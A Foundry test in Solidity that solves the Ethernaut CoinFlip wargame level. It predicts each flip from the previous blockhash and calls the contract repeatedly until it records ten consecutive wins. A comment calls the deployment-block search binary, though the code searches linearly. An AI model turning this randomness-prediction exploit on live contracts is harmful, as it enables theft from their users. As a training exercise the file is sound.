// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level3 {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract Level3Test is EthernautTest {
    function testLevel3() public {
        _createLevel("3");
        Level3 levelInstance3 = Level3(levelInstance["3"]);
        // Load the deployment block of this level
        uint256 startingTestBlock = 1 + findDeploymentBlock(address(levelInstance3), block.number);
        // Revert this test if block.number won't allow for ten forks!
        require(startingTestBlock + 10 < block.number, "Not enough blocks to complete test, try again later");
        // Fork to lower block number so we don't run out of fresh blockhashes
        vm.roll(startingTestBlock);
        while (levelInstance3.consecutiveWins() < 10) {
            // We can calculate the guess based on the blockhash
            bool guess = uint256(blockhash(block.number - 1))
                    / 57896044618658097711785492504343953926634992332820282019728792003956564819968 == 1
                ? true
                : false;
            console2.logBytes32(blockhash(block.number - 1));
            // Correctly guess
            levelInstance3.flip(guess);
            // Increment the block number as if we are waiting for the next block
            vm.roll(startingTestBlock + levelInstance3.consecutiveWins());
        }

        require(_submitLevel("3"));
    }

    function findDeploymentBlock(address level, uint256 latestBlock) internal returns (uint256 deploymentBlock) {
        // Binary search for the first block where code exists
        deploymentBlock = 0;
        while (deploymentBlock < latestBlock) {
            vm.roll(deploymentBlock);
            if (level.code.length > 0) {
                vm.roll(latestBlock);
                return deploymentBlock;
            }
            deploymentBlock++;
        }
        revert("Deployment block not found");
    }
}
